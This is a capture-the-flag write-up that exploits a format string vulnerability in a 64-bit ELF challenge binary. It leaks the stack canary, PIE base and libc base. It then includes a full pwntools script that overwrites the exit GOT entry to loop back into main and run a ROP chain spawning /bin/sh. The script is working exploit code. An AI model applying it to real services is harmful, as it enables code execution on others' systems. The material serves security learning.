# Pop Twice

The challenge file was given, an elf file checking the file propertise we could see it's a 64-bit ELF file, not stripped.

!](https://Cyberguru1.github.io/posts/phoenix/files/1688625170436.png)

let's try running the ELF file

![](https://Cyberguru1.github.io/posts/phoenix/files/1688625218436.png)

we could see it ask for input twice and print's out our input to us.

Decompiling the file in ghidra, we could see the decompiled source code:

![](https://Cyberguru1.github.io/posts/phoenix/files/1688625411779.png)

from the source code we could conclude that this is not our regular buffer overflow challenge, because for each input to the buffer there's a bound from the `fgets` function, `local_418` size is `512` and the max input is `0x200` which is `512` in decimal, simillar to `local_218`.

The only way to exploit this program is using the fomart string vulnerability, because our input stored in the buffer is printed right back to us.

Before going forward with the exploit let's run checksec on the ELF file to see the security mechanisms enabled on the file.

 ![](https://Cyberguru1.github.io/posts/phoenix/files/1688626124389.png)

we could see that `NX` and `PIE` bit is enabled, meaning we have non executable code in the stack and address layout randomization on the  ELF file respectively, we need to fuzz the ELF file and find some imortant address to bypass the security mechanism.

i wrote a simple bash fuzzer to perform this:

![](https://Cyberguru1.github.io/posts/phoenix/files/1688627879663.png)

running it we found the stack canary at index `43`

![](https://Cyberguru1.github.io/posts/phoenix/files/1688627999666.png)

we found `PIE` leak at index 139

![](https://Cyberguru1.github.io/posts/phoenix/files/1688628475148.png)

How do we know that's the `PIE` leak, this is true because main start at:

 ![](https://Cyberguru1.github.io/posts/phoenix/files/1688628544895.png)

`Libc` leak is found at index 137![](https://Cyberguru1.github.io/posts/phoenix/files/1688628727909.png)

having all this offset we could now proced with our exploit.

we could automate this using pwntools:

```python
# leaking offsets

canary_leak = "%43$p" # stack canary leak 
pie_leak = "%139$p"   # pie leak
libc_leak = "%137$p"  # libc leak

# sending payload 

p.sendline(canary_leak + " " + pie_leak +  " " +libc_leak)

result = p.recvuntil(b"\n").decode()
canary, pie, libcc = list(map(lambda x: int(x,16), result.split(" "))) 

```

we could now use the offsets found using gef to readjust the base address of the ELF files;

```python
## reseting the base address
exe.address = pie - 0x1159

log.info(f"base address : {hex(exe.address)}")

libc.address = libcc - 0x2718a  # setting libc address

log.info(f"libc address : {hex(libc.address)}")

```


let's now craft our shell payload to execute `/bin/sh`

```python

pop_rdi_ret = next(libc.search(asm('pop rdi; ret')))

exit_addr = exe.got['exit']

bin_sh = next(libc.search(b'/bin/sh\x00')) 

system_addr = libc.symbols['system']

# crafting payload for system("/bin/sh")

ad_payload = p64(pop_rdi_ret)
ad_payload += p64(bin_sh)
ad_payload += p64(system_addr)

```

using the fmtstr vulnerablity payload to reassign the `rip` pointer, we fuzz again to find the offset at which our input is stored on the stack, which is at index `70`,

using the offset we could reassing the `rip` to our payload.

the plan here to exploit this by saving our payload in the stack and running the program again and set our `rip` to where the payload is stored.

**How do we archive this ?**

we start the program and use the fmtstr vulnerability to get all necessay address to bypass the security mechanism, we then set `rip` back to main to run the program again this time we store the payload on the stack, after doing that we set the `rip` back to `pop_rdi_ret ` to run the content stored on the stack.

```python
fpayload = fmtstr_payload(70, {exit_addr:exe.symbols['main']})


p.send(fpayload)
p.sendline()


# sending the payload to save in first buffer
# for use later

p.send(ad_payload)
p.sendline()

# pointing the exit GOT addr to the payload on the buffer

fpayload = fmtstr_payload(70, {exit_addr:pop_rdi_ret})

p.send(fpayload)
p.sendline()
```

Getting all this together we have:

```python
#!/usr/bin/python

from os import system
from pwn import *
from struct import pack

## settings
context.binary = exe =  ELF("./chall")


## initializing libc
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

## spawing process
p = process(exe.path)


s_arr1 = 512 # size of buff1
s_arr2 = 520 # size of buff2

# leaking offsets

canary_leak = "%43$p" # stack canary leak 
pie_leak = "%139$p"   # pie leak
libc_leak = "%137$p"  # libc leak

# sending payload 

p.sendline(canary_leak + " " + pie_leak +  " " +libc_leak)

result = p.recvuntil(b"\n").decode()
canary, pie, libcc = list(map(lambda x: int(x,16), result.split(" "))) 


## reseting the base address
exe.address = pie - 0x1159

log.info(f"base address : {hex(exe.address)}")

libc.address = libcc - 0x2718a  # setting libc address

log.info(f"libc address : {hex(libc.address)}")


pop_rdi_ret = next(libc.search(asm('pop rdi; ret')))

exit_addr = exe.got['exit']

bin_sh = next(libc.search(b'/bin/sh\x00')) 

system_addr = libc.symbols['system']

# crafting payload for system("/bin/sh")

ad_payload = p64(pop_rdi_ret)
ad_payload += p64(bin_sh)
ad_payload += p64(system_addr)

 
# using fmtstring vuln to call main again

fpayload = fmtstr_payload(70, {exit_addr:exe.symbols['main']})


p.send(fpayload)
p.sendline()


# sending the payload to save in first buffer
# for use later

p.send(ad_payload)
p.sendline()

# pointing the exit GOT addr to the payload on the buffer

fpayload = fmtstr_payload(70, {exit_addr:pop_rdi_ret})

p.send(fpayload)
p.sendline()


# gdb.attach(p, f"""b * main+120
#                 init-gef
#                 got
#                 register
#                 c
#                 x/30wgx $rsp
#                 x/s {bin_sh}
#                 x/s {system_addr}
#                 x/i {pop_rdi_ret}""")

p.interactive()





```


Running the script we have our shell :

![](https://Cyberguru1.github.io/posts/phoenix/files/1688631576538.png)
